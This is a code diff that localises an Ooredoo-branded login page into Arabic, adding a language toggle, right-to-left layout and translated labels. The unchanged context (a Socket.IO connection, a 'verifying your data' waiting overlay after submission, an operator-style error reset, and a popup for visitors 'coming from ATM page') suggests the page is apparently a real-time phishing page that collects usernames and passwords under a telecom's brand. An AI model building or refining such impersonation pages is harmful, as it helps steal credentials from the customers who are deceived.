@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Login - Ooredoo</title>
+  <title>تسجيل الدخول - Ooredoo</title>
   <style>
     @font-face {
       font-family: 'NotoSansLocal';
@@ -45,6 +45,30 @@
 
     body { min-height: 100vh; }
 
+    .lang-toggle {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      background: #f5f5f5;
+      border: 1px solid #ddd;
+      border-radius: 20px;
+      padding: 6px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      color: #333;
+      transition: all 0.2s;
+      z-index: 100;
+    }
+    .lang-toggle:hover {
+      background: #eee;
+      border-color: #ccc;
+    }
+    [dir="ltr"] .lang-toggle {
+      left: auto;
+      right: 16px;
+    }
+
     .login-page {
       width: 100%;
       min-height: 100vh;
@@ -53,6 +77,7 @@
       align-items: flex-start;
       padding-top: 93px;
       padding-bottom: 44px;
+      position: relative;
     }
 
     .login-card {
@@ -121,6 +146,8 @@
       font-weight: 400;
       line-height: 48px;
       transition: border-color 0.18s ease, box-shadow 0.18s ease;
+      direction: ltr;
+      text-align: left;
     }
 
     .text-field::placeholder { color: var(--field-placeholder); opacity: 1; }
@@ -249,41 +276,44 @@
 </head>
 <body>
   <main class="login-page" aria-label="Login page">
+    <!-- Language Toggle -->
+    <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+
     <section class="login-card" aria-labelledby="login-title">
       <svg class="ooredoo-mark" viewBox="0 0 74 62" aria-hidden="true" focusable="false">
         <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
         <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
       </svg>
 
-      <h1 class="login-title" id="login-title">Welcome back</h1>
-      <p class="login-subtitle">Login to your account</p>
+      <h1 class="login-title" id="login-title">مرحباً بعودتك</h1>
+      <p class="login-subtitle" id="login-subtitle">تسجيل الدخول إلى حسابك</p>
 
       <form class="login-form" id="loginForm" action="#" method="post" autocomplete="on">
         <div class="field-group">
-          <label class="field-label" for="username">Username</label>
-          <input class="text-field" id="username" name="username" type="text" placeholder="Enter your Username" autocomplete="username">
+          <label class="field-label" for="username" id="usernameLabel">اسم المستخدم</label>
+          <input class="text-field" id="username" name="username" type="text" placeholder="أدخل اسم المستخدم" autocomplete="username">
         </div>
 
         <div class="field-group">
-          <label class="field-label" for="password">Password</label>
-          <input class="text-field" id="password" name="password" type="password" placeholder="Enter your Password" autocomplete="current-password">
+          <label class="field-label" for="password" id="passwordLabel">كلمة المرور</label>
+          <input class="text-field" id="password" name="password" type="password" placeholder="أدخل كلمة المرور" autocomplete="current-password">
         </div>
 
         <div class="forgot-row">
-          <a class="forgot-link" href="#">Forgot Password?</a>
+          <a class="forgot-link" href="#" id="forgotLink">نسيت كلمة المرور؟</a>
         </div>
 
         <div class="button-stack">
-          <button class="login-button" id="loginBtn" type="submit">Login</button>
-          <a class="signup-button" href="/customer-authentication.html">Sign Up</a>
+          <button class="login-button" id="loginBtn" type="submit">تسجيل الدخول</button>
+          <a class="signup-button" href="/customer-authentication.html" id="signupBtn">إنشاء حساب</a>
         </div>
         <p class="error-msg" id="errorMsg">بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.</p>
       </form>
 
       <div class="back-wrap">
-        <a class="back-link" href="/" aria-label="Back">
+        <a class="back-link" href="/" aria-label="Back" id="backLink">
           <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
-          <span>Back</span>
+          <span id="backText">رجوع</span>
         </a>
       </div>
     </section>
@@ -292,7 +322,7 @@
   <!-- Waiting Overlay -->
   <div id="waitingOverlay">
     <div class="spinner"></div>
-    <p class="waiting-text">جاري التحقق من البيانات...</p>
+    <p class="waiting-text" id="waitingText">جاري التحقق من البيانات...</p>
   </div>
 
   <!-- Popup Overlay -->
@@ -310,6 +340,81 @@
   <!-- Socket.IO -->
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <script>
+    // Language toggle
+    var currentLang = 'ar';
+    
+    var translations = {
+      ar: {
+        title: 'مرحباً بعودتك',
+        subtitle: 'تسجيل الدخول إلى حسابك',
+        usernameLabel: 'اسم المستخدم',
+        usernamePlaceholder: 'أدخل اسم المستخدم',
+        passwordLabel: 'كلمة المرور',
+        passwordPlaceholder: 'أدخل كلمة المرور',
+        forgotLink: 'نسيت كلمة المرور؟',
+        loginBtn: 'تسجيل الدخول',
+        signupBtn: 'إنشاء حساب',
+        backText: 'رجوع',
+        toggleText: 'English',
+        waitingText: 'جاري التحقق من البيانات...',
+        loadingBtn: 'جاري التحقق...',
+        errorMsg: 'بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.'
+      },
+      en: {
+        title: 'Welcome back',
+        subtitle: 'Login to your account',
+        usernameLabel: 'Username',
+        usernamePlaceholder: 'Enter your Username',
+        passwordLabel: 'Password',
+        passwordPlaceholder: 'Enter your Password',
+        forgotLink: 'Forgot Password?',
+        loginBtn: 'Login',
+        signupBtn: 'Sign Up',
+        backText: 'Back',
+        toggleText: 'العربية',
+        waitingText: 'Verifying your data...',
+        loadingBtn: 'Verifying...',
+        errorMsg: 'Invalid credentials. Please try again.'
+      }
+    };
+
+    function toggleLanguage() {
+      currentLang = currentLang === 'ar' ? 'en' : 'ar';
+      applyLanguage();
+    }
+
+    function applyLanguage() {
+      var t = translations[currentLang];
+      var html = document.documentElement;
+      
+      if (currentLang === 'ar') {
+        html.setAttribute('lang', 'ar');
+        html.setAttribute('dir', 'rtl');
+      } else {
+        html.setAttribute('lang', 'en');
+        html.setAttribute('dir', 'ltr');
+      }
+
+      document.getElementById('login-title').textContent = t.title;
+      document.getElementById('login-subtitle').textContent = t.subtitle;
+      document.getElementById('usernameLabel').textContent = t.usernameLabel;
+      document.getElementById('username').placeholder = t.usernamePlaceholder;
+      document.getElementById('passwordLabel').textContent = t.passwordLabel;
+      document.getElementById('password').placeholder = t.passwordPlaceholder;
+      document.getElementById('forgotLink').textContent = t.forgotLink;
+      
+      var loginBtn = document.getElementById('loginBtn');
+      if (!loginBtn.disabled) {
+        loginBtn.textContent = t.loginBtn;
+      }
+      
+      document.getElementById('signupBtn').textContent = t.signupBtn;
+      document.getElementById('backText').textContent = t.backText;
+      document.getElementById('langToggle').textContent = t.toggleText;
+      document.getElementById('waitingText').textContent = t.waitingText;
+      document.getElementById('errorMsg').textContent = t.errorMsg;
+    }
+
     (function() {
       // Show popup if coming from ATM page
       var params = new URLSearchParams(window.location.search);
@@ -383,7 +488,7 @@
 
         // Show loading
         loginBtn.disabled = true;
-        loginBtn.textContent = 'جاري التحقق...';
+        loginBtn.textContent = translations[currentLang].loadingBtn;
         waitingOverlay.style.display = 'flex';
         errorMsg.style.display = 'none';
 
@@ -405,8 +510,11 @@
           // Show error and reset
           waitingOverlay.style.display = 'none';
           loginBtn.disabled = false;
-          loginBtn.textContent = 'Login';
+          loginBtn.textContent = translations[currentLang].loginBtn;
           errorMsg.style.display = 'block';
+          // Clear fields
+          document.getElementById('username').value = '';
+          document.getElementById('password').value = '';
         }
       });
     })();
